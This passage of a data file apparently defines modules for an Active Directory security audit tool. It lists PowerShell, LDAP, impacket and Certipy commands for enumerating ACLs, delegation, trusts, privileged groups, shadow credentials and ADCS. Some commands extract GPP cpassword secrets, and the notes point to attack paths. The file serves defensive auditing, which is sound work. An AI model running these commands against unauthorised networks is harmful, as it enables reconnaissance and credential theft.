          { id: 'fgpp-get-all', title: 'List all PSOs', command: 'Get-ADFineGrainedPasswordPolicy -Filter *', notes: 'All Fine-Grained Password Policy objects.' },
          { id: 'fgpp-get-detailed', title: 'Get PSO details', command: 'Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name,MinPasswordLength,LockoutThreshold,LockoutDuration,PasswordHistoryCount,MinPasswordAge,MaxPasswordAge,Precedence,AppliesTo', notes: 'Full PSO attribute inventory.' },
          { id: 'fgpp-get-subjects', title: 'Get PSO applied subjects', command: 'Get-ADFineGrainedPasswordPolicySubject -Identity <PSOName>', notes: 'Users and groups the PSO applies to.' },
          { id: 'fgpp-get-resultant', title: 'Get resultant policy for user', command: 'Get-ADUserResultantPasswordPolicy -Identity <username>', notes: 'Effective policy for a specific user.' },
          { id: 'fgpp-find-weak', title: 'Find weak PSOs (len<12)', command: "Get-ADFineGrainedPasswordPolicy -Filter * | Where-Object {$_.MinPasswordLength -lt 12} | Select-Object Name,MinPasswordLength,LockoutThreshold,Precedence", notes: 'Surfaces under-hardened FGPP policies.' },
          { id: 'fgpp-find-no-lockout', title: 'Find PSOs without lockout', command: 'Get-ADFineGrainedPasswordPolicy -Filter * | Where-Object {$_.LockoutThreshold -eq 0} | Select-Object Name,Precedence', notes: 'PSOs with no account lockout — spray-resistant targets.' },
        ],
      },
      {
        id: 'fgpp-ldap', name: 'LDAP FGPP queries',
        description: 'Cross-platform PSO discovery via LDAP.',
        commands: [
          { id: 'fgpp-ldap-enum', title: 'Enumerate PSO objects', command: 'ldapsearch -x -H ldap://<IP> -b "cn=password settings container,cn=system,dc=corp,dc=com" "(objectClass=msDS-PasswordSettings)" cn msDS-MinimumPasswordLength msDS-LockoutThreshold msDS-MaximumPasswordAge msDS-PasswordHistoryLength msDS-PasswordSettingsPrecedence', notes: 'Full PSO attribute read over LDAP.' },
          { id: 'fgpp-ldap-subject', title: 'Read PSO applied subjects', command: 'ldapsearch -x -H ldap://<IP> -b "cn=password settings container,cn=system,dc=corp,dc=com" "(objectClass=msDS-PasswordSettings)" cn msDS-PSOAppliesTo', notes: 'Which users/groups each PSO targets.' },
          { id: 'fgpp-ldap-weak', title: 'Find PSOs with low history count', command: 'ldapsearch -x -H ldap://<IP> -b "cn=password settings container,cn=system,dc=corp,dc=com" "(msDS-PasswordHistoryLength<=5)" cn msDS-MinimumPasswordLength msDS-PasswordHistoryLength', notes: 'Low history = password-reuse risk.' },
          { id: 'fgpp-ldap-reversible', title: 'Find reversible-encryption PSOs', command: 'ldapsearch -x -H ldap://<IP> -b "cn=password settings container,cn=system,dc=corp,dc=com" "(msDS-PasswordReversibleEncryptionEnabled=TRUE)" cn', notes: 'Reversible encryption stores cleartext-equivalent passwords.' },
        ],
      },
    ],
    excluded_capabilities: ['policy modification', 'PSO abuse'],
  },
  {
    id: 'acl_deep',
    name: 'ACL and Object Permission Deep Dive',
    category: 'authorization',
    description: 'GenericAll, WriteDACL, GenericWrite, WriteOwner, AllExtendedRights, DCSync rights, WriteSPN, AddMember, and full DACL enumeration across high-value AD objects.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'acl-windows', name: 'Windows ACL enumeration',
        description: 'PowerShell ACL reads on AD objects.',
        commands: [
          { id: 'acl-domain-root', title: 'Read domain root ACL', command: "Get-Acl 'AD:\\DC=corp,DC=com' | Format-List", notes: 'Top-level ACEs — DCSync rights and domain-level writes live here.' },
          { id: 'acl-adminsdholder', title: 'Read AdminSDHolder ACL', command: "Get-Acl 'AD:\\CN=AdminSDHolder,CN=System,DC=corp,DC=com' | Select-Object -ExpandProperty Access", notes: 'Propagates to all adminCount=1 objects every 60 minutes.' },
          { id: 'acl-get-dcsync', title: 'Find DCSync-capable accounts', command: '(Get-Acl "AD:\\DC=corp,DC=com").Access | Where-Object { $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" } | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType', notes: 'Exact OIDs for DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, DS-Replication-Get-Changes-In-Filtered-Set.' },
          { id: 'acl-generic-all', title: 'Find GenericAll on users', command: "Get-ADUser -Filter * | ForEach-Object { (Get-Acl \"AD:\\$($_.DistinguishedName)\").Access | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll' } | Select-Object @{N='Target';E={$_.DistinguishedName}},IdentityReference,ActiveDirectoryRights }", notes: 'GenericAll = full control over target object.' },
          { id: 'acl-write-dacl', title: 'Find WriteDACL on high-value groups', command: "foreach ($g in @('Domain Admins','Enterprise Admins','Schema Admins')) { (Get-Acl \"AD:\\$(Get-ADGroup $g | Select -ExpandProperty DistinguishedName)\").Access | Where-Object { $_.ActiveDirectoryRights -match 'WriteDacl' } | Select-Object IdentityReference,ActiveDirectoryRights }", notes: 'WriteDACL = can grant self any right on the object.' },
          { id: 'acl-add-member', title: 'Find AddMember on privileged groups', command: "Get-ADGroup -Filter * -Properties nTSecurityDescriptor | ForEach-Object { $_.nTSecurityDescriptor.Access | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' -and $_.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' } | Select-Object @{N='Group';E={$_.Name}},IdentityReference }", notes: 'bf9679c0 = member attribute GUID.' },
          { id: 'acl-write-owner', title: 'Find non-default object owners', command: "Get-ADUser -Filter * | ForEach-Object { $acl = Get-Acl \"AD:\\$($_.DistinguishedName)\"; if ($acl.Owner -notmatch 'Domain Admins|Administrators|SYSTEM') { [PSCustomObject]@{Object=$_.SamAccountName;Owner=$acl.Owner} } }", notes: 'Owner can always read and modify own DACL.' },
        ],
      },
      {
        id: 'acl-linux', name: 'Linux ACL enumeration',
        description: 'impacket and ldapsearch-based ACL reads.',
        commands: [
          { id: 'acl-impacket-dacl', title: 'Dump object DACL (impacket)', command: 'impacket-dacledit <domain>/<user>:<pass>@<IP> -action read -target <DistinguishedName>', notes: 'Reads full DACL for a target object from Linux.' },
          { id: 'acl-impacket-dcsync', title: 'Check DCSync rights (impacket)', command: 'impacket-dacledit <domain>/<user>:<pass>@<IP> -action read -target-dn "DC=corp,DC=com" | grep -i "DS-Replication"', notes: 'Scans for replication rights from Linux.' },
          { id: 'acl-bloodhound-acl', title: 'BloodHound ACL analysis', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC> -c ACL', notes: 'Graph-based ACL collection for path analysis.' },
          { id: 'acl-ldapsearch-ntsecurity', title: 'Read nTSecurityDescriptor via LDAP', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=user)" nTSecurityDescriptor', notes: 'Raw SD attribute — parse with impacket ldap_shell for ACE breakdown.' },
          { id: 'acl-impacket-owneredit', title: 'Read object ownership', command: 'impacket-owneredit <domain>/<user>:<pass>@<IP> -action read -target <SamAccountName>', notes: 'Displays current owner — ownership enables DACL modification.' },
        ],
      },
    ],
    excluded_capabilities: ['ACL modification', 'privilege escalation via ACL', 'DACL write'],
  },
  {
    id: 'delegation_full',
    name: 'Delegation Configuration Analysis',
    category: 'privilege-escalation',
    description: 'Unconstrained, constrained (with and without protocol transition), RBCD, SPN-swap, KrbRelayUp prerequisites, and delegation misconfigurations across all object types.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'delegation-windows', name: 'Windows delegation queries',
        description: 'Full delegation visibility via PowerShell and AD module.',
        commands: [
          { id: 'del-unconstrained-computers', title: 'Find unconstrained delegation computers', command: 'Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -eq 515} -Properties TrustedForDelegation,DNSHostName,OperatingSystem | Select-Object Name,DNSHostName,OperatingSystem', notes: 'Non-DC computers with unconstrained delegation — high-impact coercion targets.' },
          { id: 'del-unconstrained-users', title: 'Find unconstrained delegation users', command: 'Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,ServicePrincipalName | Select-Object Name,SamAccountName,ServicePrincipalName', notes: 'User accounts with unconstrained delegation.' },
          { id: 'del-constrained-allowedto', title: 'List constrained delegation targets', command: "Get-ADObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties msDS-AllowedToDelegateTo,SamAccountName | Select-Object SamAccountName,'msDS-AllowedToDelegateTo'", notes: 'S4U2Proxy targets — servicename/hostname pairs.' },
          { id: 'del-protocol-transition', title: 'Find protocol transition accounts', command: 'Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" -Properties SamAccountName,msDS-AllowedToDelegateTo | Select-Object SamAccountName,msDS-AllowedToDelegateTo', notes: '16777216 flag = TrustedToAuthForDelegation (S4U2Self without TGT needed).' },
          { id: 'del-rbcd-all', title: 'Find all RBCD configuration', command: 'Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null } | Select-Object Name,SamAccountName', notes: 'msDS-AllowedToActOnBehalfOfOtherIdentity = RBCD write vector.' },
          { id: 'del-sensitive-notdelegated', title: 'Find sensitive accounts missing delegation protection', command: 'Get-ADUser -Filter {AdminCount -eq 1 -and AccountNotDelegated -eq $false} -Properties AdminCount,AccountNotDelegated | Select-Object Name,SamAccountName', notes: 'Privileged users not protected from delegation misuse.' },
        ],
      },
      {
        id: 'delegation-ldap', name: 'LDAP delegation queries',
        description: 'Cross-platform delegation discovery.',
        commands: [
          { id: 'del-ldap-unconstrained', title: 'Find unconstrained delegation (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" cn sAMAccountName distinguishedName userAccountControl', notes: 'TrustedForDelegation flag enumeration.' },
          { id: 'del-ldap-constrained', title: 'Find constrained delegation (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(msDS-AllowedToDelegateTo=*)" cn sAMAccountName msDS-AllowedToDelegateTo', notes: 'S4U2Proxy target SPN pairs.' },
          { id: 'del-ldap-rbcd', title: 'Find RBCD objects (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" cn sAMAccountName distinguishedName', notes: 'RBCD write targets in directory.' },
          { id: 'del-ldap-proto-transition', title: 'Find protocol transition (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" cn sAMAccountName msDS-AllowedToDelegateTo', notes: 'TrustedToAuthForDelegation accounts.' },
          { id: 'del-ldap-spn-swap', title: 'Find SPN-swap delegation candidates', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(msDS-AllowedToDelegateTo=*)(servicePrincipalName=*))" cn sAMAccountName msDS-AllowedToDelegateTo servicePrincipalName', notes: 'Accounts with both SPN and constrained delegation — SPN-swap candidates.' },
          { id: 'del-impacket-findaccounts', title: 'Delegation sweep (impacket)', command: 'impacket-findDelegation <domain>/<user>:<pass> -dc-ip <IP>', notes: 'Comprehensive delegation scan — unconstrained, constrained, RBCD, and proto-transition in one pass.' },
        ],
      },
    ],
    excluded_capabilities: ['delegation abuse', 'S4U2Self exploitation', 'RBCD writes', 'impersonation'],
  },
  {
    id: 'trust_deep',
    name: 'Domain and Forest Trust Analysis',
    category: 'topology',
    description: 'Trust enumeration, SID filtering state, transitivity, external vs forest trusts, MIT Kerberos trusts, trust direction, and cross-forest attack surface mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'trust-windows', name: 'Windows trust enumeration',
        description: 'PowerShell trust and forest inventory.',
        commands: [
          { id: 'trust-all-trusts', title: 'List all trusts', command: 'Get-ADTrust -Filter * | Select-Object Name,Source,Target,Direction,TrustType,TrustAttributes,SIDFilteringForestAware,SIDFilteringQuarantined,SelectiveAuthentication,DisallowTransivity', notes: 'Complete trust inventory with SID filtering and direction.' },
          { id: 'trust-forest-trusts', title: 'List forest trusts', command: 'Get-ADForest | Select-Object -ExpandProperty Trusts', notes: 'Inter-forest trust relationships.' },
          { id: 'trust-filter-disabled', title: 'Find SID-filtering disabled trusts', command: 'Get-ADTrust -Filter * | Where-Object { $_.SIDFilteringQuarantined -eq $false -and $_.TrustType -eq "External" } | Select-Object Name,Target,Direction,SIDFilteringQuarantined', notes: 'SID filtering off on external trust = SID history injection risk.' },
          { id: 'trust-selective-auth', title: 'Review selective authentication', command: 'Get-ADTrust -Filter * | Where-Object { $_.SelectiveAuthentication -eq $false } | Select-Object Name,Target,TrustType,Direction', notes: 'Selective auth off = any user in trusted forest can authenticate.' },
          { id: 'trust-nltest', title: 'NLTest trust enum', command: 'nltest /domain_trusts /all_trusts', notes: 'Comprehensive trust listing including MIT Kerberos.' },
          { id: 'trust-netdom', title: 'Netdom trust query', command: 'netdom trust <domain> /domain:<trustedDomain> /enumerate', notes: 'Detailed trust attribute view.' },
        ],
      },
      {
        id: 'trust-ldap', name: 'LDAP trust queries',
        description: 'Cross-platform trust discovery.',
        commands: [
          { id: 'trust-ldap-enum', title: 'Enumerate trust objects (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "cn=system,dc=corp,dc=com" "(objectClass=trustedDomain)" cn trustDirection trustType trustAttributes flatName securityIdentifier', notes: 'Full trust object enumeration with direction and SID.' },
          { id: 'trust-ldap-bidirectional', title: 'Find bidirectional trusts', command: 'ldapsearch -x -H ldap://<IP> -b "cn=system,dc=corp,dc=com" "(&(objectClass=trustedDomain)(trustDirection=3))" cn trustType trustAttributes', notes: 'Direction=3 means bidirectional — highest exposure.' },
          { id: 'trust-ldap-no-filter', title: 'Find trusts with SID filter attributes', command: 'ldapsearch -x -H ldap://<IP> -b "cn=system,dc=corp,dc=com" "(objectClass=trustedDomain)" cn trustAttributes | grep -A3 "trustAttributes"', notes: 'TrustAttributes bitmap: 8=forest,4=quarantined/SIDFiltering,64=forest-transitive.' },
          { id: 'trust-ldap-mit', title: 'Find MIT Kerberos trusts', command: 'ldapsearch -x -H ldap://<IP> -b "cn=system,dc=corp,dc=com" "(&(objectClass=trustedDomain)(trustType=4))" cn', notes: 'TrustType=4 = MIT Kerberos realm trust.' },
          { id: 'trust-impacket-getdomains', title: 'List trusted domains (impacket)', command: 'impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <IP> -all 2>&1 | grep -i "trust\|domain"', notes: 'Quick domain visibility from Linux.' },
        ],
      },
    ],
    excluded_capabilities: ['trust exploitation', 'inter-realm ticket forgery', 'SID history injection'],
  },
  {
    id: 'sensitive_groups_full',
    name: 'Sensitive Privileged Groups',
    category: 'authorization',
    description: 'Full inventory of Account Operators, Backup Operators, Print Operators, Server Operators, DNS Admins, DHCP Admins, Group Policy Creator Owners, Remote Desktop Users, and all tier-0/tier-1 security groups.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'sensitive-groups-windows', name: 'Windows sensitive group enumeration',
        description: 'PowerShell membership checks for all sensitive built-in groups.',
        commands: [
          { id: 'sg-all-dangerous', title: 'Enumerate all sensitive groups at once', command: '@("Account Operators","Backup Operators","Print Operators","Server Operators","DNS Admins","DHCP Administrators","Remote Desktop Users","Group Policy Creator Owners","Network Configuration Operators","Cryptographic Operators","Distributed COM Users","Event Log Readers","Hyper-V Administrators","Remote Management Users","Storage Replica Administrators","WinRMRemoteWMIUsers__") | ForEach-Object { Write-Host "=== $_ ===" -ForegroundColor Yellow; Get-ADGroupMember $_ -ErrorAction SilentlyContinue | Select-Object Name,SamAccountName,ObjectClass }', notes: 'One-pass inventory of all security-relevant groups.' },
          { id: 'sg-account-operators', title: 'Enumerate Account Operators', command: 'Get-ADGroupMember "Account Operators" -Recursive | Select-Object Name,SamAccountName,ObjectClass,DistinguishedName', notes: 'Can create/modify non-admin user and group objects.' },
          { id: 'sg-backup-operators', title: 'Enumerate Backup Operators', command: 'Get-ADGroupMember "Backup Operators" -Recursive | Select-Object Name,SamAccountName,ObjectClass', notes: 'SeBackupPrivilege = can read any file including NTDS.dit.' },
          { id: 'sg-dns-admins', title: 'Enumerate DNSAdmins', command: 'Get-ADGroupMember "DnsAdmins" -Recursive | Select-Object Name,SamAccountName', notes: 'DnsAdmins can load arbitrary DLL via DNS service — SYSTEM on DC.' },
          { id: 'sg-gpo-creators', title: 'Enumerate GPO Creator Owners', command: 'Get-ADGroupMember "Group Policy Creator Owners" -Recursive | Select-Object Name,SamAccountName', notes: 'Members can create and fully control GPOs they create.' },
          { id: 'sg-print-ops', title: 'Enumerate Print Operators', command: 'Get-ADGroupMember "Print Operators" | Select-Object Name,SamAccountName', notes: 'SeLoadDriverPrivilege on DCs — kernel driver load path to SYSTEM.' },
          { id: 'sg-server-ops', title: 'Enumerate Server Operators', command: 'Get-ADGroupMember "Server Operators" | Select-Object Name,SamAccountName', notes: 'Can start/stop services, logon locally, and backup DCs.' },
          { id: 'sg-remote-mgmt', title: 'Enumerate Remote Management Users', command: 'Get-ADGroupMember "Remote Management Users" | Select-Object Name,SamAccountName', notes: 'WinRM access without local admin — lateral movement vector.' },
          { id: 'sg-enterprise-key-admins', title: 'Enumerate Enterprise Key Admins', command: 'Get-ADGroupMember "Enterprise Key Admins" -ErrorAction SilentlyContinue | Select-Object Name,SamAccountName', notes: 'Can write msDS-KeyCredentialLink = Shadow Credentials on any object.' },
        ],
      },
      {
        id: 'sensitive-groups-ldap', name: 'LDAP sensitive group queries',
        description: 'Cross-platform sensitive group enumeration.',
        commands: [
          { id: 'sg-ldap-by-rid', title: 'Enumerate groups by well-known RIDs', command: 'for rid in 548 551 550 549 553 557; do ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=group)(objectSid=*-${rid}))" cn member; done', notes: 'RIDs: 548=Account Operators, 551=Backup, 550=Print, 549=Server, 553=RAS, 557=Enterprise RO Controllers.' },
          { id: 'sg-ldap-dns-admins', title: 'Find DNSAdmins members (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=group)(cn=DnsAdmins))" member', notes: 'Direct LDAP read for DNSAdmins membership.' },
          { id: 'sg-ldap-schema-admins', title: 'Find Schema Admins (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=group)(cn=Schema Admins))" member cn', notes: 'Schema Admins — forest-level control.' },
          { id: 'sg-ldap-key-admins', title: 'Find Key Admins and Enterprise Key Admins', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(|(cn=Key Admins)(cn=Enterprise Key Admins))" member cn', notes: 'Shadow credential write capability.' },
        ],
      },
    ],
    excluded_capabilities: ['privilege abuse', 'group membership modification'],
  },
  {
    id: 'os_inventory',
    name: 'Operating System and Patch Inventory',
    category: 'infrastructure',
    description: 'OS version, build, end-of-support status, hotfix coverage, and legacy Windows enumeration across all domain-joined computers.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'os-windows', name: 'Windows OS inventory',
        description: 'PowerShell OS and patch baseline checks.',
        commands: [
          { id: 'os-all-computers', title: 'Full OS inventory', command: 'Get-ADComputer -Filter * -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,LastLogonDate | Select-Object Name,OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,LastLogonDate | Sort-Object OperatingSystem', notes: 'All domain computers with OS and version.' },
          { id: 'os-legacy-xp', title: 'Find Windows XP / 2003', command: 'Get-ADComputer -Filter {OperatingSystem -like "*XP*" -or OperatingSystem -like "*2003*"} -Properties OperatingSystem,LastLogonDate | Select-Object Name,OperatingSystem,LastLogonDate', notes: 'End-of-support Windows XP and Server 2003.' },
          { id: 'os-legacy-7', title: 'Find Windows 7 / 2008', command: 'Get-ADComputer -Filter {OperatingSystem -like "*Windows 7*" -or OperatingSystem -like "*2008*"} -Properties OperatingSystem,LastLogonDate | Select-Object Name,OperatingSystem,LastLogonDate', notes: 'End-of-support Windows 7 and Server 2008/R2.' },
          { id: 'os-legacy-8', title: 'Find Windows 8 / 2012', command: 'Get-ADComputer -Filter {OperatingSystem -like "*Windows 8*" -or OperatingSystem -like "*2012*"} -Properties OperatingSystem | Select-Object Name,OperatingSystem', notes: 'Legacy OS inventory.' },
          { id: 'os-count-by-version', title: 'Count by OS version', command: 'Get-ADComputer -Filter * -Properties OperatingSystem | Group-Object OperatingSystem | Sort-Object Count -Descending | Select-Object Name,Count', notes: 'Fleet distribution summary.' },
          { id: 'os-hotfix-status', title: 'Query hotfix status (WMI)', command: 'Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20 HotFixID,Description,InstalledOn', notes: 'Recent patch history on the queried host.' },
          { id: 'os-wmi-remote', title: 'Remote OS query via CIM', command: 'Get-CimInstance -ComputerName <hostname> -ClassName Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,LastBootUpTime', notes: 'Remote OS and build detail when CIM is accessible.' },
        ],
      },
      {
        id: 'os-linux', name: 'Linux OS discovery',
        description: 'Remote OS fingerprinting from a Linux node.',
        commands: [
          { id: 'os-nmap-os', title: 'OS fingerprinting with nmap', command: 'nmap -O -sV --osscan-guess -p 445,139,3389 <IP>', notes: 'OS version inference from network responses.' },
          { id: 'os-cme-os', title: 'OS discovery with CrackMapExec', command: 'crackmapexec smb <IP/CIDR> 2>/dev/null | awk \'{print $4,$5,$6,$7}\'', notes: 'Fast OS and domain info across a subnet.' },
          { id: 'os-ldap-os', title: 'OS attribute via LDAP', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=computer)" dNSHostName operatingSystem operatingSystemVersion lastLogonTimestamp', notes: 'Directory-sourced OS inventory without touching endpoints.' },
        ],
      },
    ],
    excluded_capabilities: ['remote exploitation', 'patch bypass'],
  },
  {
    id: 'sysvol_scan',
    name: 'SYSVOL Content and Scripts',
    category: 'policy',
    description: 'SYSVOL share content, logon scripts, startup scripts, cpassword (GPP secrets), VBScript/batch payload, and scheduled task XML discovery.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'sysvol-windows', name: 'Windows SYSVOL enumeration',
        description: 'Read-only SYSVOL browse and content discovery.',
        commands: [
          { id: 'sysvol-list', title: 'List SYSVOL top-level', command: 'dir \\\\<domain>\\SYSVOL\\<domain>', notes: 'Top-level SYSVOL structure.' },
          { id: 'sysvol-scripts', title: 'List logon scripts', command: 'dir \\\\<domain>\\SYSVOL\\<domain>\\scripts', notes: 'Logon scripts — may contain credentials or execution paths.' },
          { id: 'sysvol-gpo-list', title: 'List GPO folders', command: 'dir \\\\<domain>\\SYSVOL\\<domain>\\Policies', notes: 'Policy folder per GPO GUID.' },
          { id: 'sysvol-cpassword', title: 'Search SYSVOL for cpassword', command: 'findstr /S /I "cpassword" \\\\<domain>\\SYSVOL\\<domain>\\*.xml 2>$null', notes: 'GPP credentials encrypted with a known static key (MS14-025).' },
          { id: 'sysvol-cpassword-ps', title: 'PowerShell cpassword scan', command: 'Get-ChildItem -Recurse \\\\<domain>\\SYSVOL -Include "*.xml" -ErrorAction SilentlyContinue | Select-String -Pattern "cpassword" | Select-Object Path,LineNumber,Line', notes: 'Recursive XML scan for plaintext-equivalent passwords.' },
          { id: 'sysvol-task-xml', title: 'Find scheduled task XMLs', command: 'Get-ChildItem -Recurse \\\\<domain>\\SYSVOL -Include "ScheduledTasks.xml","Tasks.xml" -ErrorAction SilentlyContinue | Select-Object FullName', notes: 'Scheduled task configurations including RunAs identity.' },
          { id: 'sysvol-vbs-bat', title: 'Find script files', command: 'Get-ChildItem -Recurse \\\\<domain>\\SYSVOL -Include "*.bat","*.cmd","*.vbs","*.ps1" -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime', notes: 'Script inventory for logic and credential review.' },
        ],
      },
      {
        id: 'sysvol-linux', name: 'Linux SYSVOL scan',
        description: 'SMB-based SYSVOL access from Linux.',
        commands: [
          { id: 'sysvol-smbclient', title: 'Browse SYSVOL share', command: 'smbclient \\\\<IP>\\SYSVOL -U <domain>\\<user>%<pass> -c "ls"', notes: 'SYSVOL share top-level listing.' },
          { id: 'sysvol-impacket-cpassword', title: 'Dump GPP cpassword (impacket)', command: 'impacket-Get-GPPPassword <domain>/<user>:<pass>@<IP>', notes: 'Automated cpassword extraction and decryption.' },
          { id: 'sysvol-spider', title: 'Spider SYSVOL for credentials', command: 'crackmapexec smb <IP> -u <user> -p <pass> -M gpp_password', notes: 'Automated GPP password module via CME.' },
        ],
      },
    ],
    excluded_capabilities: ['script modification', 'GPO tampering'],
  },
  {
    id: 'shadow_creds_enum',
    name: 'Shadow Credentials Enumeration',
    category: 'credential-access',
    description: 'msDS-KeyCredentialLink enumeration, Key Trust discovery, PKINIT-capable accounts, and shadow credential backdoor detection across users and computers.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'shadow-windows', name: 'Windows shadow credential checks',
        description: 'PowerShell reads of Key Credential attributes.',
        commands: [
          { id: 'shadow-users-all', title: 'Find users with KeyCredentialLink', command: "Get-ADUser -Filter * -Properties msDS-KeyCredentialLink | Where-Object { $_.'msDS-KeyCredentialLink' } | Select-Object SamAccountName,DistinguishedName,'msDS-KeyCredentialLink'", notes: 'Populated attribute = PKINIT credential registered or backdoored.' },
          { id: 'shadow-computers-all', title: 'Find computers with KeyCredentialLink', command: "Get-ADComputer -Filter * -Properties msDS-KeyCredentialLink | Where-Object { $_.'msDS-KeyCredentialLink' } | Select-Object Name,SamAccountName,DistinguishedName,'msDS-KeyCredentialLink'", notes: 'Computer accounts with shadow credential material.' },
          { id: 'shadow-device-id', title: 'Decode key credential device IDs', command: "Get-ADUser -Filter * -Properties msDS-KeyCredentialLink | Where-Object { $_.'msDS-KeyCredentialLink' } | Select-Object SamAccountName,@{N='KeyDeviceIDs';E={$_.'msDS-KeyCredentialLink' | ForEach-Object { ([System.Convert]::FromBase64String($_)) | Format-Hex }}}", notes: 'Decodes key entries to assess legitimacy.' },
          { id: 'shadow-write-capable', title: 'Find accounts that can write KeyCredentialLink', command: "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object { $_.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063' } | Select-Object IdentityReference,ActiveDirectoryRights", notes: 'Key Admins and objects with AllowedAttributes write.' },
        ],
      },
      {
        id: 'shadow-ldap', name: 'LDAP shadow credential queries',
        description: 'Cross-platform shadow credential discovery.',
        commands: [
          { id: 'shadow-ldap-users', title: 'Find shadow cred users (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(msDS-KeyCredentialLink=*))" sAMAccountName msDS-KeyCredentialLink distinguishedName', notes: 'User accounts with key trust entries.' },
          { id: 'shadow-ldap-computers', title: 'Find shadow cred computers (LDAP)', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectClass=computer)(msDS-KeyCredentialLink=*))" dNSHostName sAMAccountName msDS-KeyCredentialLink', notes: 'Computer accounts with shadow credentials.' },
          { id: 'shadow-pywhisker', title: 'List shadow creds (pyWhisker)', command: 'pywhisker -d <domain> -u <user> -p <pass> --target <target> --action list', notes: 'Tool-assisted shadow credential enumeration without modification.' },
          { id: 'shadow-certipy', title: 'List key credentials (Certipy)', command: 'certipy shadow -u <user>@<domain> -p <pass> -dc-ip <IP> -target <target> list', notes: 'Certipy shadow credential listing.' },
        ],
      },
    ],
    excluded_capabilities: ['shadow credential write', 'key injection', 'certificate-based authentication abuse'],
  },
  {
    id: 'adcs_esc_full',
    name: 'ADCS ESC Vulnerability Analysis',
    category: 'certificate-services',
    description: 'ESC1 through ESC16 template misconfiguration enumeration, CA ACL analysis, enrollment rights, SAN flags, manager approval, and ADCS attack surface mapping.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'],
    read_only: false,
    command_groups: [
      {
        id: 'adcs-certipy', name: 'Certipy ADCS analysis',
        description: 'Comprehensive ADCS enumeration from Linux using Certipy.',
        commands: [
          { id: 'adcs-certipy-find', title: 'Full ADCS audit (Certipy)', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable -stdout', notes: 'Finds all vulnerable templates with ESC classification.' },
          { id: 'adcs-certipy-find-json', title: 'Export ADCS findings to JSON', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -json -output adcs_audit', notes: 'Machine-readable ADCS findings output.' },
          { id: 'adcs-certipy-ca', title: 'Enumerate CAs (Certipy)', command: 'certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -enabled', notes: 'CA enumeration with enrollment services and template assignments.' },
